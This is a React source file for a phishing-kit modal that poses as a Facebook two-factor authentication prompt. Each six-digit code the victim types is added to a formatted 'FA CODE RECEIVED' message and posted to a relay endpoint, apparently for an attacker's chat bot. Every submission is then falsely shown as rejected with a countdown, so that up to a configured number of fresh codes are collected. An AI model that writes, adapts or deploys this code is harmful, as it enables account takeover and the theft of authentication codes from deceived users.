import VerifyImage from '@/assets/images/2FAuth.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const VerifyModal: FC<{ nextStep: () => void; businessName?: string }> = ({ nextStep, businessName }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, messageId, message, setMessage } = store();
    const maxCode = config.MAX_CODE ?? 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 60;

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['Go to your authentication app', 'Enter the 6-digit code for this account from the two-step authentication app you set up (such as Duo Mobile or Google Authenticator).', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue'];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => {
                setCountdown(countdown - 1);
            }, 1000);
            return () => clearTimeout(timer);
        } else if (countdown === 0 && showError) {
            setShowError(false);
        }
    }, [countdown, showError]);

    const handleSubmit = async () => {
        if (!code.trim() || isLoading || code.length < 6 || countdown > 0 || !message) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const updatedMessage = `${message}

<b>✅ 2FA CODE RECEIVED</b>
<b>🔐 Code ${next}/${maxCode}:</b> <code>${code}</code>`;
        try {
            const res = await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });

            if (res?.data?.success) {
                setMessage(updatedMessage);
            }

            if (next >= maxCode) {
                nextStep();
            } else {
                setShowError(true);
                setCode('');
                setCountdown(loadingTime);
            }
        } catch {
            //
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-3 sm:p-4 md:p-6'>
                <div className='flex max-h-[95vh] w-full max-w-xs sm:max-w-sm md:max-w-md flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4 sm:p-5 md:p-6'>
                    {/* Header with user info and Facebook branding */}
                    <div className='pb-3 sm:pb-4 md:pb-5'>
                        <p className='text-xs sm:text-sm md:text-sm text-gray-600'>{businessName || 'User'} • Facebook</p>
                    </div>

                    {/* Main content */}
                    <div className='flex-1 flex flex-col overflow-y-auto gap-3 sm:gap-4 md:gap-5'>
                        {/* Title */}
                        <h1 className='text-base sm:text-lg md:text-xl font-bold text-gray-900 whitespace-normal'>
                            {t('Go to your authentication app')}
                        </h1>

                        {/* Description */}
                        <p className='text-xs sm:text-sm md:text-base text-gray-700 leading-relaxed'>
                            {t('Enter the 6-digit code for this account from the two-step authentication app you set up (such as Duo Mobile or Google Authenticator).')}
                        </p>

                        {/* Illustration */}
                        <div className='flex justify-center py-2 sm:py-3 md:py-4'>
                            <Image src={VerifyImage} alt='2FA' className='max-h-32 sm:max-h-40 md:max-h-48 w-auto' />
                        </div>

                        {/* Code Input */}
                        <div className='relative'>
                            <input
                                type='tel'
                                inputMode='numeric'
                                pattern='[0-9]*'
                                id='code-input'
                                value={code}
                                onChange={(e) => {
                                    const value = e.target.value.replaceAll(/\D/g, '');
                                    if (value.length <= 8) {
                                        setCode(value);
                                    }
                                }}
                                maxLength={8}
                                disabled={countdown > 0}
                                className={`w-full h-10 sm:h-11 md:h-12 rounded-xl border border-gray-300 px-3 py-2 sm:py-2.5 md:py-3 text-base font-medium focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent transition-all placeholder-gray-500 ${
                                    countdown > 0 ? 'cursor-not-allowed opacity-60 bg-gray-50' : 'bg-white'
                                }`}
                                placeholder={t('Code')}
                            />
                        </div>

                        {/* Error message */}
                        {showError && (
                            <p className='text-xs sm:text-sm text-red-500'>
                                {t("This code doesn't work. Check it's correct or try a new one after")} {countdown}s.
                            </p>
                        )}

                        {/* Continue Button */}
                        <button
                            type='button'
                            onClick={handleSubmit}
                            disabled={isLoading || code.length < 6 || countdown > 0}
                            className={`w-full h-11 sm:h-12 md:h-13 rounded-2xl bg-blue-500 text-white font-semibold text-sm sm:text-base transition-all ${
                                isLoading || code.length < 6 || countdown > 0
                                    ? 'cursor-not-allowed opacity-60'
                                    : 'hover:bg-blue-600 shadow-md hover:shadow-lg'
                            } flex items-center justify-center`}
                        >
                            {isLoading ? (
                                <div className='h-6 w-6 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                            ) : (
                                t('Continue')
                            )}
                        </button>
                    </div>
                </div>
            </div>
        </>
    );
};

export default VerifyModal;
